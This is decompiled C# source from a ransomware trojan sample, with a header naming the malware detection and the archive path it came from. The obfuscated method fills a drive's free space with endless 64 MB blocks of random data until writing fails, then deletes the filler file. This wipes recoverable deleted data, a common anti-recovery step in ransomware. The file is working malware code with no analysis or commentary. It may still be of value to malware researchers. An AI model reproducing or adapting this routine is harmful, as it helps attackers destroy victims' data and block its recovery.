// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Program, Version=1.0.0.0, Culture=neutral, PublicKeyToken=fad59cbbeaedaaa1
// MVID: 2B038658-8CEB-4874-AE4E-D5E8C7A3049F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.MSIL.Gen.gen-274011aaa97fd19ad6d993a5555c9306090da6a9b16c991739033ebb7673a244.exe

using \u0003;
using System;
using System.IO;
using System.Runtime.InteropServices;

namespace \u0001
{
  internal sealed class \u0001
  {
    public static unsafe void \u0001([In] DriveInfo obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
      *(long*) voidPtr = 0L;
      *(long*) ((IntPtr) voidPtr + 8) = (long) Environment.TickCount;
      byte[] numArray = new byte[67108864];
      byte[] buffer;
      if (true)
        buffer = numArray;
      Random random = new Random();
      *(int*) ((IntPtr) voidPtr + 16) = 0;
      string path;
      while (true)
      {
        path = Path.Combine(obj0.Name, \u0002.\u0001(107389225) + ((int*) ((IntPtr) voidPtr + 16))->ToString() + \u0002.\u0001(107395839));
        if (File.Exists(path))
          *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
        else
          break;
      }
      try
      {
        using (FileStream fileStream = new FileStream(path, FileMode.CreateNew, FileAccess.Write))
        {
          while (true)
          {
            do
            {
              random.NextBytes(buffer);
              fileStream.Write(buffer, 0, buffer.Length);
              *(long*) voidPtr = *(long*) voidPtr + (long) buffer.Length;
            }
            while ((long) Environment.TickCount - *(long*) ((IntPtr) voidPtr + 8) <= 1L);
            *(long*) ((IntPtr) voidPtr + 8) = (long) Environment.TickCount;
          }
        }
      }
      catch (Exception ex)
      {
      }
      try
      {
        File.Delete(path);
      }
      catch (Exception ex)
      {
      }
    }
  }
}
